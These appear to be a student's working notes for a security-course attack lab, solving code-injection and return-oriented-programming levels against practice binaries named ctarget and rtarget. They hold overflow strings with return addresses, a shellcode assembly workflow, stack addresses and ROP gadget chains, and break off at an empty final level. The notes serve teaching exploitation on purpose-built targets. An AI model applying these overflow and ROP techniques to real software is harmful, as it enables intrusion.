Level 1:
* target : 0000000000401962
* buf size : 40
1) Get address of touch1() `objdump -d ./ctarget`
2) Find buf size
3) Exploit! `python -c "print 'echo ' + 'A'*40+ '\x62\x19\x40'"` | ./ctarget -q

Level 2:
1) Write shellcode (2exploit.asm)
	* assemble and link: 
	** nasm -f elf64 exploit.asm
	** ld exploit.o -o exploit
	* verify shellcode works using gdb
2) get hex from exploit binary
	* objdump -d 2exploit
	* copy and paste to text doc
	* remove everything except hex
3) hex2raw < 2exploithex.txt > 2exploitraw.txt
4) get address of stack
	* in gdb:
	** br right after Gets() instruction in getbuf()
	** x $rsp = 0x55614128
5) Craft exploit string
	* must adjust buffer padding (As) for size of the shellcode
	** wc 2exploitraw.txt
	** 40 - 20 = 20
	* `python -c "sh=open('2exploitraw.txt').read(); print 'echo ' + sh + 'A'*20+ '\x28\x41\x61\x55'"` | ./ctarget -q


Level 3:
1) Write shellcode (3exploit.asm)
	* Use shellcode from previous level and adjust
	** must stash a string version of the cookie to a safe place (higher) on the stack so following function calls don't erase it
	* assemble and link: 
	** nasm -f elf64 exploit.asm
	** ld exploit.o -o exploit
	* verify shellcode works using gdb
2) get hex from exploit binary
	* objdump -d 2exploit
	* copy and paste to text doc
	* remove everything except hex
3) hex2raw < 2exploithex.txt > 2exploitraw.txt
4) get address of stack
	* NOTE: same as previous level
	* in gdb:
	** br right after Gets() instruction in getbuf()
	** x $rsp = 0x55614128
5) Craft exploit string
	* must adjust buffer padding (As) for size of the shellcode
	** wc 2exploitraw.txt
	** 40 - 20 = 20
	* `python -c "sh=open('3exploit2raw.txt').read(); print 'echo ' + sh + 'A'*5 + '\x28\x41\x61\x55'"` | ./ctarget -q

-----------Phase 2---------

Level 2:
GOAL: set rdi=0x5ff762f9 then jump to touch2
PLAN: set up the stack like so:
	As
	1st gadget address (pop to some register)
	0x5ff762f9
	2nd gadget address (move from some register to rdi)
	address of touch2

1) find gadgets to set rdi
	* objdump -d rtarget | less
	* look between start_farm and mid_farm
	* gadget1: 401b4a: 58 c3 # pop rax; ret
	* gadget2: 401b57: 89 c7 c3 # movl rdi, rax ; ret
2) Craft exploit string:
	* used python script to make it more convenient, see 4exploitstringgen.py
	to create exploit string:
	** python 4exploitstringgen.py
	** creates 4exploitstring.txt
	
Level 3:
